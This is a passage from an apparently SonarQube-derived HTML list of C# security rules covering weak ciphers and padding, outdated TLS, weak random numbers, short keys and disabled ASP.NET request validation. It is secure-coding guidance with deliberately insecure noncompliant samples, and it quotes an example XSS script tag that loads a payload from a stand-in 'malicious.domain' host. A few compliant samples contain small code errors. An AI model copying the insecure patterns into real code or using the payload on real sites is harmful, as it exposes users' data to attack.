<p>And for RSA, the weakest algorithms are either using it without padding or using the PKCS1v1.5 padding scheme.</p>
<h3>What is the potential impact?</h3>
<p>The cleartext of an encrypted message might be recoverable. Additionally, it might be possible to modify the cleartext of an encrypted message.</p>
<p>Below are some real-world scenarios that illustrate possible impacts of an attacker exploiting the vulnerability.</p>
<h4>Theft of sensitive data</h4>
<p>The encrypted message might contain data that is considered sensitive and should not be known to third parties.</p>
<p>By using a weak algorithm the likelihood that an attacker might be able to recover the cleartext drastically increases.</p>
<h4>Additional attack surface</h4>
<p>By modifying the cleartext of the encrypted message it might be possible for an attacker to trigger other vulnerabilities in the code. Encrypted
values are often considered trusted, since under normal circumstances it would not be possible for a third party to modify them.</p>
<h2>How to fix it in .NET</h2>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<p>Example with a symmetric cipher, AES:</p>
<pre data-diff-id="1" data-diff-type="noncompliant">
using System.Security.Cryptography;

public void encrypt()
{
    AesManaged aes &#61; new AesManaged
    {
        keysize &#61; 128,
        blocksize &#61; 128,
        mode &#61; ciphermode.ecb,        // Noncompliant
        padding &#61; paddingmode.pkcs7
    };
}
</pre>
<p>Note that Microsoft has marked derived cryptographic types like <code>AesManaged</code> as no longer recommended for use.</p>
<p>Example with an asymmetric cipher, RSA:</p>
<pre data-diff-id="2" data-diff-type="noncompliant">
using System.Security.Cryptography;

public void encrypt()
{
    RSACryptoServiceProvider RsaCsp &#61; new RSACryptoServiceProvider();
    byte[] encryptedData            &#61; RsaCsp.Encrypt(dataToEncrypt, false); // Noncompliant
}
</pre>
<h4>Compliant solution</h4>
<p>For the AES symmetric cipher, use the GCM mode:</p>
<pre data-diff-id="1" data-diff-type="compliant">
using System.Security.Cryptography;

public void encrypt()
{
    AesGcm aes &#61; AesGcm(key);
}
</pre>
<p>For the RSA asymmetric cipher, use the Optimal Asymmetric Encryption Padding (OAEP):</p>
<pre data-diff-id="2" data-diff-type="compliant">
using System.Security.Cryptography;

public void encrypt()
{
    RSACryptoServiceProvider RsaCsp &#61; new RSACryptoServiceProvider();
    byte[] encryptedData            &#61; RsaCsp.Encrypt(dataToEncrypt, true);
}
</pre>
<h3>How does this work?</h3>
<p>As a rule of thumb, use the cryptographic algorithms and mechanisms that are considered strong by the cryptographic community.</p>
<p>Appropriate choices are currently the following.</p>
<h4>For AES: Use Galois/Counter mode (GCM)</h4>
<p>GCM mode combines encryption with authentication and integrity checks using a cryptographic hash function and provides both confidentiality and
authenticity of data.</p>
<p>Other similar modes are:</p>
<ul><li> CCM: <code>Counter with CBC-MAC</code> </li><li> CWC: <code>Cipher Block Chaining with Message Authentication Code</code> </li><li> EAX: <code>Encrypt-and-Authenticate</code> </li><li> IAPM: <code>Integer Authenticated Parallelizable Mode</code> </li><li> OCB: <code>Offset Codebook Mode</code> </li></ul>
<p>It is also possible to use AES-CBC with HMAC for integrity checks. However, it</p>
<p>is considered more straightforward to use AES-GCM directly instead.</p>
<h4>For RSA: use the OAEP scheme</h4>
<p>The Optimal Asymmetric Encryption Padding scheme (OAEP) adds randomness and a secure hash function that strengthens the regular inner workings of
RSA.</p>
<h2>Resources</h2>
<h3>Articles &amp; blog posts</h3>
<ul><li> <a href="https://learn.microsoft.com/en-us/dotnet/standard/security/vulnerabilities-cbc-mode" rel="nofollow">Microsoft, Timing vulnerabilities with CBC-mode
  symmetric decryption using padding</a> </li><li> <a href="https://en.wikipedia.org/wiki/Padding_oracle_attack" rel="nofollow">Wikipedia, Padding Oracle Attack</a> </li><li> <a href="https://en.wikipedia.org/wiki/Chosen-ciphertext_attack" rel="nofollow">Wikipedia, Chosen-Ciphertext Attack</a> </li><li> <a href="https://en.wikipedia.org/wiki/Chosen-plaintext_attack" rel="nofollow">Wikipedia, Chosen-Plaintext Attack</a> </li><li> <a href="https://en.wikipedia.org/wiki/Semantic_security" rel="nofollow">Wikipedia, Semantically Secure Cryptosystems</a> </li><li> <a href="https://en.wikipedia.org/wiki/Optimal_asymmetric_encryption_padding" rel="nofollow">Wikipedia, OAEP</a> </li><li> <a href="https://en.wikipedia.org/wiki/Galois/Counter_Mode" rel="nofollow">Wikipedia, Galois/Counter Mode</a> </li></ul>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" rel="nofollow">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://cwe.mitre.org/data/definitions/327" rel="nofollow">MITRE, CWE-327</a> - Use of a Broken or Risky Cryptographic Algorithm </li><li> <a href="https://www.sans.org/top25-software-errors/#cat3" rel="nofollow">SANS Top 25</a> - Porous Defenses </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=csharpsquid:S4212">
              csharpsquid:S4212
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Because serialization constructors allocate and initialize objects, security checks that are present on regular constructors must also be present
on a serialization constructor. Failure to do so would allow callers that could not otherwise create an instance to use the serialization constructor
to do this.</p>
<p>This rule raises an issue when a type implements the <code>System.Runtime.Serialization.ISerializable</code> interface, is not a delegate or
interface, is declared in an assembly that allows partially trusted callers and has a constructor that takes a
<code>System.Runtime.Serialization.SerializationInfo</code> object and a <code>System.Runtime.Serialization.StreamingContext</code> object which is
not secured by a security check, but one or more of the regular constructors in the type is secured.</p>
<h3>Noncompliant code example</h3>
<pre>
using System;
using System.IO;
using System.Runtime.Serialization;
using System.Runtime.Serialization.Formatters.Binary;
using System.Security;
using System.Security.Permissions;

[assembly: AllowPartiallyTrustedCallersAttribute()]
namespace MyLibrary
{
    [Serializable]
    public class Foo : ISerializable
    {
        private int n;

        [FileIOPermissionAttribute(SecurityAction.Demand, Unrestricted &#61; true)]
        public Foo()
        {
           n &#61; -1;
        }

        protected Foo(SerializationInfo info, StreamingContext context) // Noncompliant
        {
           n &#61; (int)info.GetValue(&#34;n&#34;, typeof(int));
        }

        void ISerializable.GetObjectData(SerializationInfo info, StreamingContext context)
        {
           info.AddValue(&#34;n&#34;, n);
        }
    }
}
</pre>
<h3>Compliant solution</h3>
<pre>
using System;
using System.IO;
using System.Runtime.Serialization;
using System.Runtime.Serialization.Formatters.Binary;
using System.Security;
using System.Security.Permissions;

[assembly: AllowPartiallyTrustedCallersAttribute()]
namespace MyLibrary
{
    [Serializable]
    public class Foo : ISerializable
    {
        private int n;

        [FileIOPermissionAttribute(SecurityAction.Demand, Unrestricted &#61; true)]
        public Foo()
        {
           n &#61; -1;
        }

        [FileIOPermissionAttribute(SecurityAction.Demand, Unrestricted &#61; true)]
        protected Foo(SerializationInfo info, StreamingContext context)
        {
           n &#61; (int)info.GetValue(&#34;n&#34;, typeof(int));
        }

        void ISerializable.GetObjectData(SerializationInfo info, StreamingContext context)
        {
           info.AddValue(&#34;n&#34;, n);
        }
    }
}
</pre>
<h2>Resources</h2>
<ul><li> <a href="https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/" rel="nofollow">OWASP Top 10 2021 Category A8</a> - Software and Data
  Integrity Failures </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A8_2017-Insecure_Deserialization" rel="nofollow">OWASP Top 10 2017 Category A8</a> - Insecure
  Deserialization </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=csharpsquid:S4423">
              csharpsquid:S4423
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability exposes encrypted data to a number of attacks whose goal is to recover the plaintext.</p>
<h2>Why is this an issue?</h2>
<p>Encryption algorithms are essential for protecting sensitive information and ensuring secure communications in a variety of domains. They are used
for several important reasons:</p>
<ul><li> Confidentiality, privacy, and intellectual property protection </li><li> Security during transmission or on storage devices </li><li> Data integrity, general trust, and authentication </li></ul>
<p>When selecting encryption algorithms, tools, or combinations, you should also consider two things:</p>
<ol><li> No encryption is unbreakable. </li><li> The strength of an encryption algorithm is usually measured by the effort required to crack it within a reasonable time frame. </li></ol>
<p>For these reasons, as soon as cryptography is included in a project, it is important to choose encryption algorithms that are considered strong and
secure by the cryptography community.</p>
<p>To provide communication security over a network, SSL and TLS are generally used. However, it is important to note that the following protocols are
all considered weak by the cryptographic community, and are officially deprecated:</p>
<ul><li> SSL versions 1.0, 2.0 and 3.0 </li><li> TLS versions 1.0 and 1.1 </li></ul>
<p>When these unsecured protocols are used, it is best practice to expect a breach: that a user or organization with malicious intent will perform
mathematical attacks on this data after obtaining it by other means.</p>
<h3>What is the potential impact?</h3>
<p>After retrieving encrypted data and performing cryptographic attacks on it on a given timeframe, attackers can recover the plaintext that
encryption was supposed to protect.</p>
<p>Depending on the recovered data, the impact may vary.</p>
<p>Below are some real-world scenarios that illustrate the potential impact of an attacker exploiting the vulnerability.</p>
<h4>Additional attack surface</h4>
<p>By modifying the plaintext of the encrypted message, an attacker may be able to trigger additional vulnerabilities in the code. An attacker can
further exploit a system to obtain more information.<br /> Encrypted values are often considered trustworthy because it would not be possible for a
third party to modify them under normal circumstances.</p>
<h4>Breach of confidentiality and privacy</h4>
<p>When encrypted data contains personal or sensitive information, its retrieval by an attacker can lead to privacy violations, identity theft,
financial loss, reputational damage, or unauthorized access to confidential systems.</p>
<p>In this scenario, the company, its employees, users, and partners could be seriously affected.</p>
<p>The impact is twofold, as data breaches and exposure of encrypted data can undermine trust in the organization, as customers, clients and
stakeholders may lose confidence in the organization’s ability to protect their sensitive data.</p>
<h4>Legal and compliance issues</h4>
<p>In many industries and locations, there are legal and compliance requirements to protect sensitive data. If encrypted data is compromised and the
plaintext can be recovered, companies face legal consequences, penalties, or violations of privacy laws.</p>
<h2>How to fix it in .NET</h2>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<p>These samples use TLSv1.0 as the default TLS algorithm, which is cryptographically weak.</p>
<pre data-diff-id="1" data-diff-type="noncompliant">
using System.Net;

public void encrypt()
{
    ServicePointManager.SecurityProtocol &#61; SecurityProtocolType.Tls; // Noncompliant
}
</pre>
<pre data-diff-id="2" data-diff-type="noncompliant">
using System.Net.Http;
using System.Security.Authentication;

public void encrypt()
{
    new HttpClientHandler
    {
        SslProtocols &#61; SslProtocols.Tls // Noncompliant
    };
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
Using System.Net;

public void encrypt()
{
    ServicePointManager.SecurityProtocol &#61; SecurityProtocolType.Tls12 | SecurityProtocolType.Tls13;
}
</pre>
<pre data-diff-id="2" data-diff-type="compliant">
using System.Net.Http;
using System.Security.Authentication;

public void encrypt()
{
    new HttpClientHandler
    {
        SslProtocols &#61; SslProtocols.Tls12
    };
}
</pre>
<h3>How does this work?</h3>
<p>As a rule of thumb, by default you should use the cryptographic algorithms and mechanisms that are considered strong by the cryptographic
community.</p>
<p>The best choices at the moment are the following.</p>
<h4>Use TLS v1.2 or TLS v1.3</h4>
<p>Even though TLS V1.3 is available, using TLS v1.2 is still considered good and secure practice by the cryptography community.<br /></p>
<p>The use of TLS v1.2 ensures compatibility with a wide range of platforms and enables seamless communication between different systems that do not
yet have TLS v1.3 support.</p>
<p>The only drawback depends on whether the framework used is outdated: its TLS v1.2 settings may enable older and insecure cipher suites that are
deprecated as insecure.</p>
<p>On the other hand, TLS v1.3 removes support for older and weaker cryptographic algorithms, eliminates known vulnerabilities from previous TLS
versions, and improves performance.</p>
<h2>Resources</h2>
<h3>Articles &amp; blog posts</h3>
<ul><li> <a href="https://en.wikipedia.org/wiki/Padding_oracle_attack" rel="nofollow">Wikipedia, Padding Oracle Attack</a> </li><li> <a href="https://en.wikipedia.org/wiki/Chosen-ciphertext_attack" rel="nofollow">Wikipedia, Chosen-Ciphertext Attack</a> </li><li> <a href="https://en.wikipedia.org/wiki/Chosen-plaintext_attack" rel="nofollow">Wikipedia, Chosen-Plaintext Attack</a> </li><li> <a href="https://en.wikipedia.org/wiki/Semantic_security" rel="nofollow">Wikipedia, Semantically Secure Cryptosystems</a> </li><li> <a href="https://en.wikipedia.org/wiki/Optimal_asymmetric_encryption_padding" rel="nofollow">Wikipedia, OAEP</a> </li><li> <a href="https://en.wikipedia.org/wiki/Galois/Counter_Mode" rel="nofollow">Wikipedia, Galois/Counter Mode</a> </li></ul>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" rel="nofollow">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://cwe.mitre.org/data/definitions/327" rel="nofollow">MITRE, CWE-327</a> - Use of a Broken or Risky Cryptographic Algorithm </li><li> <a href="https://www.sans.org/top25-software-errors/#cat3" rel="nofollow">SANS Top 25</a> - Porous Defenses </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=csharpsquid:S2245">
              csharpsquid:S2245
            </a>
          </td>
          <td>
            <details>
              <p>Using pseudorandom number generators (PRNGs) is security-sensitive. For example, it has led in the past to the following vulnerabilities:</p>
<ul><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2013-6386" rel="nofollow">CVE-2013-6386</a> </li><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2006-3419" rel="nofollow">CVE-2006-3419</a> </li><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2008-4102" rel="nofollow">CVE-2008-4102</a> </li></ul>
<p>When software generates predictable values in a context requiring unpredictability, it may be possible for an attacker to guess the next value that
will be generated, and use this guess to impersonate another user or access sensitive information.</p>
<p>As the <code>System.Random</code> class relies on a pseudorandom number generator, it should not be used for security-critical applications or for
protecting sensitive data. In such context, the <code>System.Cryptography.RandomNumberGenerator</code> class which relies on a cryptographically
strong random number generator (RNG) should be used in place.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> the code using the generated value requires it to be unpredictable. It is the case for all encryption mechanisms or when a secret value, such
  as a password, is hashed. </li><li> the function you use generates a value which can be predicted (pseudo-random). </li><li> the generated value is used multiple times. </li><li> an attacker can access the generated value. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> Only use random number generators which are <a href="https://cheatsheetseries.owasp.org/cheatsheets/Cryptographic_Storage_Cheat_Sheet.html#secure-random-number-generation" rel="nofollow">recommended by
  OWASP</a> or any other trusted organization. </li><li> Use the generated random values only once. </li><li> You should not expose the generated random value. If you have to store it, make sure that the database or file is secure. </li></ul>
<h2>Sensitive Code Example</h2>
<pre>
var random &#61; new Random(); // Sensitive use of Random
byte[] data &#61; new byte[16];
random.NextBytes(data);
return BitConverter.ToString(data); // Check if this value is used for hashing or encryption
</pre>
<h2>Compliant Solution</h2>
<pre>
using System.Security.Cryptography;
...
var randomGenerator &#61; RandomNumberGenerator.Create(); // Compliant for security-sensitive use cases
byte[] data &#61; new byte[16];
randomGenerator.GetBytes(data);
return BitConverter.ToString(data);
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" rel="nofollow">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x08-v3-cryptography_verification_requirements" rel="nofollow">Mobile AppSec
  Verification Standard</a> - Cryptography Requirements </li><li> <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m5-insufficient-cryptography" rel="nofollow">OWASP Mobile Top 10 2016 Category M5</a> -
  Insufficient Cryptography </li><li> <a href="https://cwe.mitre.org/data/definitions/338" rel="nofollow">MITRE, CWE-338</a> - Use of Cryptographically Weak Pseudo-Random Number Generator (PRNG)
  </li><li> <a href="https://cwe.mitre.org/data/definitions/330" rel="nofollow">MITRE, CWE-330</a> - Use of Insufficiently Random Values </li><li> <a href="https://cwe.mitre.org/data/definitions/326" rel="nofollow">MITRE, CWE-326</a> - Inadequate Encryption Strength </li><li> <a href="https://cwe.mitre.org/data/definitions/1241" rel="nofollow">MITRE, CWE-1241</a> - Use of Predictable Algorithm in Random Number Generator </li><li> Derived from FindSecBugs rule <a href="https://h3xstream.github.io/find-sec-bugs/bugs.htm#PREDICTABLE_RANDOM" rel="nofollow">Predictable Pseudo Random Number
  Generator</a> </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=csharpsquid:S4426">
              csharpsquid:S4426
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability exposes encrypted data to attacks whose goal is to recover the plaintext.</p>
<h2>Why is this an issue?</h2>
<p>Encryption algorithms are essential for protecting sensitive information and ensuring secure communications in a variety of domains. They are used
for several important reasons:</p>
<ul><li> Confidentiality, privacy, and intellectual property protection </li><li> Security during transmission or on storage devices </li><li> Data integrity, general trust, and authentication </li></ul>
<p>When selecting encryption algorithms, tools, or combinations, you should also consider two things:</p>
<ol><li> No encryption is unbreakable. </li><li> The strength of an encryption algorithm is usually measured by the effort required to crack it within a reasonable time frame. </li></ol>
<p>In today’s cryptography, the length of the <strong>key</strong> directly affects the security level of cryptographic algorithms.</p>
<p>Note that depending on the algorithm, the term <strong>key</strong> refers to a different mathematical property. For example:</p>
<ul><li> For RSA, the key is the product of two large prime numbers, also called the <strong>modulus</strong>. </li><li> For AES and Elliptic Curve Cryptography (ECC), the key is only a sequence of randomly generated bytes.
    <ul><li> In some cases, AES keys are derived from a master key or a passphrase using a Key Derivation Function (KDF) like PBKDF2 (Password-Based Key
      Derivation Function 2) </li></ul>  </li></ul>
<p>If an application uses a key that is considered short and <strong>insecure</strong>, the encrypted data is exposed to attacks aimed at getting at
the plaintext.</p>
<p>In general, it is best practice to expect a breach: that a user or organization with malicious intent will perform cryptographic attacks on this
data after obtaining it by other means.</p>
<h3>What is the potential impact?</h3>
<p>After retrieving encrypted data and performing cryptographic attacks on it on a given timeframe, attackers can recover the plaintext that
encryption was supposed to protect.</p>
<p>Depending on the recovered data, the impact may vary.</p>
<p>Below are some real-world scenarios that illustrate the potential impact of an attacker exploiting the vulnerability.</p>
<h4>Additional attack surface</h4>
<p>By modifying the plaintext of the encrypted message, an attacker may be able to trigger additional vulnerabilities in the code. An attacker can
further exploit a system to obtain more information.<br /> Encrypted values are often considered trustworthy because it would not be possible for a
third party to modify them under normal circumstances.</p>
<h4>Breach of confidentiality and privacy</h4>
<p>When encrypted data contains personal or sensitive information, its retrieval by an attacker can lead to privacy violations, identity theft,
financial loss, reputational damage, or unauthorized access to confidential systems.</p>
<p>In this scenario, the company, its employees, users, and partners could be seriously affected.</p>
<p>The impact is twofold, as data breaches and exposure of encrypted data can undermine trust in the organization, as customers, clients and
stakeholders may lose confidence in the organization’s ability to protect their sensitive data.</p>
<h4>Legal and compliance issues</h4>
<p>In many industries and locations, there are legal and compliance requirements to protect sensitive data. If encrypted data is compromised and the
plaintext can be recovered, companies face legal consequences, penalties, or violations of privacy laws.</p>
<h2>How to fix it in .NET</h2>
<h3>Code examples</h3>
<p>The following code examples either explicitly or implicitly generate keys. Note that there are differences in the size of the keys depending on the
algorithm.</p>
<p>Due to the mathematical properties of the algorithms, the security requirements for the key size vary depending on the algorithm.<br /> For example,
a 256-bit ECC key provides about the same level of security as a 3072-bit RSA key and a 128-bit symmetric key.</p>
<h4>Noncompliant code example</h4>
<p>Here is an example of a private key generation with RSA:</p>
<pre data-diff-id="1" data-diff-type="noncompliant">
using System;
using System.Security.Cryptography;

public void encrypt()
{
    var RsaCsp &#61; new RSACryptoServiceProvider(); // Noncompliant
}
</pre>
<p>Here is an example of a key generation with the Digital Signature Algorithm (DSA):</p>
<pre data-diff-id="2" data-diff-type="noncompliant">
using System;
using System.Security.Cryptography;

public void encrypt()
{
    var DsaCsp &#61; new DSACryptoServiceProvider(); // Noncompliant
}
</pre>
<p>Here is an example of an Elliptic Curve (EC) initialization. It implicitly generates a private key whose size is indicated in the algorithm
name:</p>
<pre data-diff-id="3" data-diff-type="noncompliant">
using System;
using System.Security.Cryptography;

public void encrypt()
{
    ECDsa ecdsa &#61; ECDsa.Create(ECCurve.NamedCurves.brainpoolP160t1); // Noncompliant
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
using System;
using System.Security.Cryptography;

public void encrypt()
{
    var RsaCsp &#61; new RSACryptoServiceProvider(2048);
}
</pre>
<pre data-diff-id="2" data-diff-type="compliant">
using System;
using System.Security.Cryptography;

public void encrypt()
{
    var Dsa &#61; new DSACng(2048);
}
</pre>
<pre data-diff-id="3" data-diff-type="compliant">
using System;
using System.Security.Cryptography;

public void encrypt()
{
    ECDsa ecdsa &#61; ECDsa.Create(ECCurve.NamedCurves.nistP256);
}
</pre>
<h3>How does this work?</h3>
<p>As a rule of thumb, use the cryptographic algorithms and mechanisms that are considered strong by the cryptographic community.</p>
<p>The appropriate choices are the following.</p>
<h4>RSA (Rivest-Shamir-Adleman) and DSA (Digital Signature Algorithm)</h4>
<p>The security of these algorithms depends on the difficulty of attacks attempting to solve their underlying mathematical problem.</p>
<p>In general, a minimum key size of <strong>2048</strong> bits is recommended for both.</p>
<h4>AES (Advanced Encryption Standard)</h4>
<p>AES supports three key sizes: 128 bits, 192 bits and 256 bits. The security of the AES algorithm is based on the computational complexity of trying
all possible keys.<br /> A larger key size increases the number of possible keys and makes exhaustive search attacks computationally infeasible.
Therefore, a 256-bit key provides a higher level of security than a 128-bit or 192-bit key.</p>
<p>Currently, a minimum key size of <strong>128 bits</strong> is recommended for AES.</p>
<h4>Elliptic Curve Cryptography (ECC)</h4>
<p>Elliptic curve cryptography is also used in various algorithms, such as ECDSA, ECDH, or ECMQV. The length of keys generated with elliptic curve
algorithms are mentioned directly in their names. For example, <code>secp256k1</code> generates a 256-bits long private key.</p>
<p>Currently, a minimum key size of <strong>224 bits</strong> is recommended for EC algorithms.</p>
<h3>Pitfalls</h3>
<h4>The KeySize Property is not a setter</h4>
<p>The following code is invalid:</p>
<pre>
 ----
     var RsaCsp &#61; new RSACryptoServiceProvider();
     RsaCsp.KeySize &#61; 2048;
----
</pre>
<p>The KeySize property of CryptoServiceProviders cannot be updated because the setter simply does not exist. This means that this line will not
perform any update on <code>KeySize</code>, and the compiler won’t raise an Exception when compiling it. This should not be considered a
workaround.<br /> To change the key size, use one of the overloaded constructors with the desired key size instead.</p>
<h3>Going the extra mile</h3>
<h4>Pre-Quantum Cryptography</h4>
<p>Encrypted data and communications recorded today could be decrypted in the future by an attack from a quantum computer.<br /> It is important to keep
in mind that NIST-approved digital signature schemes, key agreement, and key transport may need to be replaced with secure quantum-resistant (or
&#34;post-quantum&#34;) counterpart.</p>
<p>Thus, if data is to remain secure beyond 2030, proactive measures should be taken now to ensure its safety.</p>
<p><a href="https://www.enisa.europa.eu/publications/post-quantum-cryptography-current-state-and-quantum-mitigation" rel="nofollow">Learn more here</a>.</p>
<h2>Resources</h2>
<h3>Articles &amp; blog posts</h3>
<ul><li> <a href="https://learn.microsoft.com/en-us/dotnet/standard/security/vulnerabilities-cbc-mode" rel="nofollow">Microsoft, Timing vulnerabilities with CBC-mode
  symmetric decryption using padding</a> </li><li> <a href="https://en.wikipedia.org/wiki/Padding_oracle_attack" rel="nofollow">Wikipedia, Padding Oracle Attack</a> </li><li> <a href="https://en.wikipedia.org/wiki/Chosen-ciphertext_attack" rel="nofollow">Wikipedia, Chosen-Ciphertext Attack</a> </li><li> <a href="https://en.wikipedia.org/wiki/Chosen-plaintext_attack" rel="nofollow">Wikipedia, Chosen-Plaintext Attack</a> </li><li> <a href="https://en.wikipedia.org/wiki/Semantic_security" rel="nofollow">Wikipedia, Semantically Secure Cryptosystems</a> </li><li> <a href="https://en.wikipedia.org/wiki/Optimal_asymmetric_encryption_padding" rel="nofollow">Wikipedia, OAEP</a> </li><li> <a href="https://en.wikipedia.org/wiki/Galois/Counter_Mode" rel="nofollow">Wikipedia, Galois/Counter Mode</a> </li></ul>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" rel="nofollow">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x08-v3-cryptography_verification_requirements" rel="nofollow">Mobile AppSec
  Verification Standard</a> - Cryptography Requirements </li><li> <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m5-insufficient-cryptography" rel="nofollow">OWASP Mobile Top 10 2016 Category M5</a> -
  Insufficient Cryptography </li><li> <a href="https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-131Ar1.pdf" rel="nofollow">NIST 800-131A</a> - Recommendation for Transitioning the
  Use of Cryptographic Algorithms and Key Lengths* <a href="https://cwe.mitre.org/data/definitions/326" rel="nofollow">MITRE, CWE-326</a> - Inadequate Encryption
  Strength </li><li> <a href="https://cwe.mitre.org/data/definitions/327" rel="nofollow">MITRE, CWE-327</a> - Use of a Broken or Risky Cryptographic Algorithm </li><li> <a href="https://wiki.sei.cmu.edu/confluence/x/hDdGBQ" rel="nofollow">CERT, MSC61-J.</a> - Do not use insecure or weak cryptographic algorithms </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=csharpsquid:S5753">
              csharpsquid:S5753
            </a>
          </td>
          <td>
            <details>
              <p>ASP.NET 1.1&#43; comes with a feature called <em>Request Validation</em>, preventing the server to accept content containing un-encoded HTML. This
feature comes as a first protection layer against Cross-Site Scripting (XSS) attacks and act as a simple Web Application Firewall (WAF) rejecting
requests potentially containing malicious content.</p>
<p>While this feature is not a silver bullet to prevent all XSS attacks, it helps to catch basic ones. It will for example prevent <code>&lt;script
type&#61;&#34;text/javascript&#34; src&#61;&#34;https://malicious.domain/payload.js&#34;&gt;</code> to reach your Controller.</p>
<p>Note: <em>Request Validation</em> feature being only available for ASP.NET, no Security Hotspot is raised on ASP.NET Core applications.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> the developer doesn’t know the impact to deactivate the Request Validation feature </li><li> the web application accepts user-supplied data </li><li> all user-supplied data are not validated </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> Activate the Request Validation feature for all HTTP requests </li></ul>
<h2>Sensitive Code Example</h2>
<p>At Controller level:</p>
<pre>
[ValidateInput(false)]
public ActionResult Welcome(string name)
{
  ...
}
</pre>
<p>At application level, configured in the Web.config file:</p>
<pre>
&lt;configuration&gt;
   &lt;system.web&gt;
      &lt;pages validateRequest&#61;&#34;false&#34; /&gt;
      ...
      &lt;httpRuntime requestValidationMode&#61;&#34;0.0&#34; /&gt;
   &lt;/system.web&gt;
&lt;/configuration&gt;
</pre>
<h2>Compliant Solution</h2>
<p>At Controller level:</p>
<pre>
[ValidateInput(true)]
public ActionResult Welcome(string name)
{
  ...
}
</pre>
<p>or</p>
<pre>
public ActionResult Welcome(string name)
{
  ...
}
</pre>
<p>At application level, configured in the Web.config file:</p>
<pre>
&lt;configuration&gt;
   &lt;system.web&gt;
      &lt;pages validateRequest&#61;&#34;true&#34; /&gt;
      ...
      &lt;httpRuntime requestValidationMode&#61;&#34;4.5&#34; /&gt;
   &lt;/system.web&gt;
&lt;/configuration&gt;
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A03_2021-Injection/" rel="nofollow">OWASP Top 10 2021 Category A3</a> - Injection </li><li> <a href="https://docs.microsoft.com/en-us/dotnet/api/system.web.configuration.httpruntimesection.requestvalidationmode?view&#61;netframework-4.8" rel="nofollow">HttpRuntimeSection.RequestValidationMode Property</a> </li><li> <a href="https://owasp.org/www-community/ASP-NET_Request_Validation" rel="nofollow">OWASP ASP.NET Request Validation</a> </li><li> <a href="https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html" rel="nofollow">OWASP Cheat Sheet</a> - XSS
  Prevention Cheat Sheet </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A7_2017-Cross-Site_Scripting_%28XSS%29" rel="nofollow">OWASP Top 10 2017 Category A7</a> - Cross-Site
  Scripting (XSS) </li><li> <a href="https://cwe.mitre.org/data/definitions/79" rel="nofollow">MITRE, CWE-79</a> - Improper Neutralization of Input During Web Page Generation
  (&#39;Cross-site Scripting&#39;) </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=csharpsquid:S3330">
              csharpsquid:S3330
            </a>
          </td>
          <td>
            <details>
              <p>When a cookie is configured with the <code>HttpOnly</code> attribute set to <em>true</em>, the browser guaranties that no client-side script will
be able to read it. In most cases, when a cookie is created, the default value of <code>HttpOnly</code> is <em>false</em> and it’s up to the developer
to decide whether or not the content of the cookie can be read by the client-side script. As a majority of Cross-Site Scripting (XSS) attacks target
